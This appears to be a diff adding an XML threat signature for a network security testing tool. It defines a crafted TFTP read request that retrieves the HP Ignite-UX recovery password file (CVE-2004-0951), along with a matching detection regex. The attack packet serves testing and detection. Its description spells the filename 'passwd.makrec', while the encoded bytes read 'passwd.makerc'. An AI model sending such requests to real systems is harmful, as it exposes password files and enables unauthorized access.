@@ -1,0 +1,76 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="HP Ignite-UX TFTP passwd Download"/>
+    <EngDesc display="true" value="This threat issues a TFTP request for a password file that the HP Ignite application can inadvertently expose.  The TFTP request is for the file /var/opt/ignite/recovery/passwd.makrec.  TFTP typically uses UDP port 69."/>
+    <Intent display="true">
+      <item value="Scoping"/>
+      <item value="Unauthorized_Access"/>
+    </Intent>
+    <Protocol display="true" value="TFTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="HP"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="HP_Ignite-UX"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="HP_Ignite-UX_C.6.2.241"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.corsaire.com/advisories/c041123-001.txt"/>
+    <CVEID display="true" value="CVE-2004-0951"/>
+    <bugtraqID display="true" value="14568"/>
+    <OSVDB display="true" value="18749"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="00000105cd1dbb3700c000a80001003c494dccc5"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="none"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632726551303437500"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X00\X01\X2F\X76\X61\X72\X2F\X6F\X70\X74\X2F\X69\X67\X6E\X69\X74\X65\X2F\X72\X65\X63\X6F\X76\X65\X72\X79\X2F\X70\X61\X73\X73\X77\X64\X2E\X6D\X61\X6B\X65\X72\X63\X00\X6E\X65\X74\X61\X73\X63\X69\X69\X00"/>
+    <Created value="1139462065" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="B"/>
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+    </for>
+  </Loops>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="0" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="" TTL="@random(30,50)" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <UDP srcPort="@random(1026,65535)" destPort="$destPort" checksum="" length="">
+          <TFTP_RRQ OpCode="0001" FilenameNullTerm="2F7661722F6F70742F69676E6974652F7265636F766572792F7061737377642E6D616B65726300" ModeNullTerm="6E6574617363696900"/>
+        </UDP>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
